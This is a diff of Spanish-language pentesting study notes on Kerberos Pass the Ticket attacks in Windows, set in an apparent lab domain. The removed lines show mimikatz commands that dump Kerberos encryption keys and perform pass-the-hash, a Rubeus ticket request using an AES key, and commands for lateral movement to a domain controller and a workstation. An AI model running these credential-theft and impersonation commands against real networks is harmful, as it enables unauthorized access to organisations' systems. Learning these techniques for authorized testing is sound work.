@@ -1,4 +1,4 @@
-# Pass the Ticket desde Windows
+# Pass the Ticket en Windows
 
 ## Introduccion al funcionamiento de kerberos
 El sistema de autenticación Kerberos se basa en tickets. La idea central de Kerberos es no entregar la contraseña de una cuenta a cada servicio que utilizas. En su lugar, Kerberos mantiene todos los tickets en tu sistema local y presenta a cada servicio solo el ticket específico para ese servicio, evitando que un ticket se utilice para otro propósito.
@@ -96,61 +96,11 @@ mimikatz # exit
 > se puede utilizar el modulo misc::cmd de mimikatz para no tener que salir de la herramienta y haga spawn de una CMD con el ticket ya importado.
 
 
-----
+---
 
-## Pass The Key / Overpass the hash
-Técnica que consiste en utilizar un hash de contraseña NTLM para convertirlo en un ticket válido de kerberos. (TGT).  Lo primero que necesitamos es obtener las claves de cifrado de kerberos.
+### PASO 3: MOVIMIENTO LATERAL (Conexión WinRM con el Ticket)
 
-
-##### obtener claves de cifrado kerberos con mimikatz
-```powershell
-# Obtener claves `AES256_HMAC` y `RC4_HMAC`
-privilege::debug
-sekurlsa::ekeys
-
-# OUTPUT
-y List :
-           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
-           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
-           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
-           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
-           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
-           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
-```
-
-##### Acontecer Pass the Key con Mimikatz
-Con esta key rc4 podemos hacer el pass the key:
-```powershell
-
-privilege::debug
-
-sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
-```
-
-Esto creará una nueva ventana de `cmd.exe` que podemos usar para solicitar acceso a cualquier servicio que queramos en el contexto del usuario objetivo.
-
-Ejemplos de uso una vez tenemos ya el ticket y estamos en la nueva ventana de CMD como el usuario suplantado:
-```cmd
-dir \\DC01\C$
-
-# Para control remoto de otro equipo de la red si tenemos permisos
-Enter-PSSession -ComputerName WKSTN02
-```
-
-##### Acontecer Pass the Key con Rubeus
-> Lo bueno es que para esto con Rubeus no necesitamos permisos de administrador
-
-```
-# Como puedes ver aqui estamos utilizando la aes256
-Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
-```
-
->NOTA PASS THE KEY: En entornos modernos, utilizar rc4 se interpreta como downgrade de cifrado, entonces lo que se utiliza es el AES256 o AES128
-
-----
-## Utilizar PtT para conectarse por WinRM a otra victima
-
-Ejemplo de como aprovechar un TGT para conectarnos a una maquina remota del dominio (siempre y cuando tengamos privilegios para ello), y acontecer un movimiento lateral de maquina.
+Ejemplo de cómo aprovechar un TGT inyectado para conectarnos a una máquina remota del dominio (siempre y cuando tengamos privilegios para ello) y realizar movimiento lateral:
 
 ##### Mimikatz
 Igual que en PtT, importamos con mimikatz el ticket previamente obtenido
